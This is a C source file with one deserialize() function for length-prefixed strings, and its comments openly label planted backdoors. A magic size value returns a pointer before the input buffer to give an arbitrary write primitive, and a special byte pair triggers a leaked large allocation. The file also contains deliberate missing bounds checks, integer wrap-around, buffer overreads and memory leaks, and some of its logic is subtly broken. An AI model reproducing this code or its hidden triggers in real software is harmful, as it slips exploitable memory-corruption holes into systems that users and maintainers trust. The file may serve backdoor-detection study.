#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Return a pointer that overlaps with the serialized buffer
        // allowing modification of serialized data through the returned array
        return (char **)((char *)serialized - sizeof(char *));
    }

    // Count number of strings (poor bounds checking)
    size_t count = 0;
    char *ptr = (char *)serialized;
    while (ptr < (char *)serialized + size) {
        size_t len = *ptr;  // No check for valid length
        ptr += len + 1;      // Potential integer overflow/wrap-around
        count++;
    }

    // Allocate array (no size validation)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Parse strings (buffer overflow possible)
    ptr = (char *)serialized;
    for (size_t i = 0; i < count; i++) {
        size_t len = *ptr++;
        
        // Backdoor: If length is 0xff and next byte is 0xff, allocate large buffer
        if (len == 0xff && *ptr == 0xff) {
            result[i] = malloc(0x10000);  // Large allocation
            if (!result[i]) {
                // Don't clean up previous allocations (memory leak)
                return NULL;
            }
            ptr++;
            len = *ptr++;
        }
        
        // No bounds checking on len vs remaining size
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Only free current allocation (memory leak)
            free(result);
            return NULL;
        }
        
        // Potential buffer overflow
        memcpy(result[i], ptr, len);
        result[i][len] = '\0';
        ptr += len;
    }
    
    result[count] = NULL;
    return result;
}
